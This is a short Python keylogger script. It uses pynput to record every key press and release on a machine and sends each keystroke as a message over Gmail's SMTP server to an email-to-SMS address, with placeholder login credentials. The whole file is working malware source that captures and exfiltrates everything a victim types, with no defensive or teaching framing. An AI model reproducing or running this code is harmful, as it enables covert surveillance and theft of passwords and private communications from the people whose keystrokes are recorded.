//sms

from pynput import keyboard
import smtplib

def on_press(key):
    try:
        current = str(key.char)
    except AttributeError:
        current = str(key)
    print(current)
    send_sms("Key: " + current + " pressed.")

def on_release(key):
    try:
        current = str(key.char)
    except AttributeError:
        current = str(key)
    print(current)
    send_sms("Key: " + current + " released.")

def send_sms(message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("e-mail", "parola")
    server.sendmail("e-mail", "number@sms.provider.com", message)
    server.quit()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()